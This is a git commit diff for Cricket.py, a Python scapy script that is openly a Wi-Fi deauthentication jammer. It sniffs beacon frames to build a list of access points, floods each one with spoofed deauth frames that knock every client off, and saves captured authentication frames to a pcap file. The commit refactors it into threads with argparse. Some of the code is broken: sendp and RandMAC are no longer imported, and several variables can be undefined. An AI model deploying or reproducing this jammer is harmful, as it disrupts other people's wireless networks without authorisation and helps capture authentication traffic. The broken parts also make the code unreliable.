873bb4ee85063e9e256d6bd4b0569a13a29f5f14
wyvern <wyvern@debian>
2020-07-28 20:56:50 +0800

    Changed program to threaded, fixed bugs

--- Cricket.py
+++ Cricket.py
@@ -1,108 +1,81 @@
 #!/bin/python3
-
 from sys import argv
 from os import path
-from scapy.all import *
-#from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
-#from scapy.utils import PcapWriter
-#from scapy.sendrecv import sniff
-
-CLI = argv[:]
+import argparse
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
+from scapy.utils import PcapWriter
+from scapy.sendrecv import sniff
+import threading
 
 global AP_list
-global ignore_AP
-
-# PROGRAM SEQUENCE
-# 1. Locate AP via sniffing beacons
-# 2. Add to list of APs
-# 3. Send deauth to all APs in list
-# 4. Sniff for Auth Frames
-
-help_message = """
-Cricket.py
-
-Usage:
-	Cricket.py [options]
-		<iface> will send or receive all packets unless otherwise specified
-
-Options:
-	-h								Display this help message
-	-v 								Enable verbose output for this program
-	-i ["BSSID, ..." | PATH]	 	Ignore AP(s), either listing AP's or using a file separated by lines
-	-o <FILE>						Output captured Auth packets to FILE
-
-The output of this file will be 
-"""
-verbose = False
-output_file = None
-ignore_AP = []
 AP_list = []
 
+parser = argparse.ArgumentParser()
+group = parser.add_mutually_exclusive_group()
 
-for x in range(1,len(CLI) - 1):
-	if CLI[x] == "-h":
-		print(help_message)
-		quit()
-	if CLI[x] == "-v":
-		verbose = True
-	if CLI[x] == "-i":
-		if os.path.exists(CLI[x+1]):
-			with open(CLI[x+1]) as file:
-				ignore_AP.append(file.readlines())
-		else:
-			ignore_AP = CLI[x+1].split(", ")
-	if CLI[x] == "-o":
-		output_file = CLI[x+1]
+parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Enable verbose logging', default=False)
 
-if verbose == True:
+group.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs inside this file')
+group.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs given by command line input')
+
+parser.add_argument('-o', '--output', dest='output', action='store', type=str, help='File to write captured Auth Frames to (will only jam if not set)')
+
+args = parser.parse_args()
+
+if args.verbose == True:
 	def verbose_output(status, output, *details):
 		if status == 1:
 			statement = "\t[*] "
 		elif status == 0:
 			statement = "\t[ ] "
 		elif status == 2:
-			statement = ""
+			statement = "\t\t"
 		statement += output
-		for x in details:
-			statement += "\n\t\t" + x
+		if details:
+			for x in details:
+				statement += "\n\t\t\t" + x
 		print(statement)
 else:
 	def verbose_output(status, output, *details):
 		return None
 
-init_statement = f'''Initialised program with variables:
-	verbose = {verbose}
-	output_file = {output_file}
-	Ignoring AP's: '''
+if args.list:
+	ignore_AP = args.list
+elif args.file:
+	with open(args.file, 'r') as file:
+		ignore_AP = [file.readlines()]
 
-verbose_output(2, init_statement, *ignore_AP)
+if args.output:
+	output = PcapWriter(args.output, append=True)
 
-if output_file != None:
-	output = PcapWriter(output_file, append=True)
 
-def Jammer(AP_list):
+def Jammer():
 	if len(AP_list) != 0:
 		for AP in AP_list:
-			verbose_output(1, f'De-Authenticating All Clients on AP:', AP)
+			verbose_output(1, f'De-Authenticating All Clients on AP {AP}')
 			DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
 			sendp(DeAuth_Frame)
 
 def PacketHandler(packet):
 	verbose_output(1, f'Found packet')
 	if packet.haslayer(Dot11):
-		if packet.type == 0:
-			verbose_output(1, f'Found Management Frame')
-			if packet.subtype == 8:
-				verbose_output(1, f'Found Beacon Frame')
-				if packet.addr2 not in ignore_AP and packet.addr2 not in AP_list:
-					AP_list.append(packet.addr2)
-					verbose_output(1, f'Access Point Found: {packet.addr2}')
-			elif packet.subtype == 11:
-				if output:
-					output.write(packet)
-					verbose_output(1, f'Authentication Frame Found for AP {packet.addr2}')
-	Jammer(AP_list)
+		if packet.addr2 not in ignore_AP:
+			if packet.type == 0:
+				verbose_output(1, f'Found Management Frame')
+				if packet.subtype == 8:
+					verbose_output(1, f'Found Beacon Frame')
+					if packet.addr2 not in AP_list:
+						AP_list.append(packet.addr2)
+						verbose_output(1, f'Access Point Found: {packet.addr2}')
+				elif packet.subtype == 11:
+					if output:
+						output.write(packet)
+						verbose_output(1, f'Authentication Frame Found for AP {packet.addr2}')
 
 verbose_output(0, f'Starting loop')
 
-sniff(prn = PacketHandler, monitor = True)
+beaconSniffer = threading.Thread(target = sniff, kwargs = dict(prn=PacketHandler))
+jammer = threading.Thread(target = Jammer)
+
+beaconSniffer.start()
+jammer.start()
